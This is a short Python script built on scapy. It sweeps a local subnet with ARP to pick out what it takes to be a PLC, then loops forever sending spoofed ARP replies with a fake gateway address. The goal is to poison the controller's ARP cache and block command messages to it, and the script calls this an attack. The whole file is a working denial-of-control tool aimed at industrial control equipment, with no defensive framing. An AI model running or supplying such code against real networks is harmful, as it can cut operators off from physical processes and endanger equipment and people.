from scapy.all import ARP, Ether, srp, send
import socket
import time
import os

def find_plc_ip():
    # Define the IP range to scan (adjust as needed)
    ip_range = "192.168.1.1/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]
    
    # Extract the IP and MAC addresses of devices on the network
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    # Assume the PLC is the first device found (customize as needed)
    if devices:
        plc_ip = devices[0]['ip']
        print(f"PLC IP Address found: {plc_ip}")
        return plc_ip
    else:
        print("No PLC found on the network.")
        return None

def block_command_message(plc_ip):
    print(f"Blocking command messages to PLC at {plc_ip}...")
    
    # Create a spoofed ARP packet to poison the PLC's ARP cache
    spoofed_packet = ARP(op=2, pdst=plc_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc="192.168.1.254")  # Use a fake gateway IP
    
    try:
        while True:
            send(spoofed_packet, verbose=0)
            print(f"Sent spoofed ARP packet to {plc_ip}")
            time.sleep(2)  # Send the packet every 2 seconds
    except KeyboardInterrupt:
        print("Stopping the attack...")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        block_command_message(plc_ip)
    else:
        print("Unable to proceed without PLC IP address.")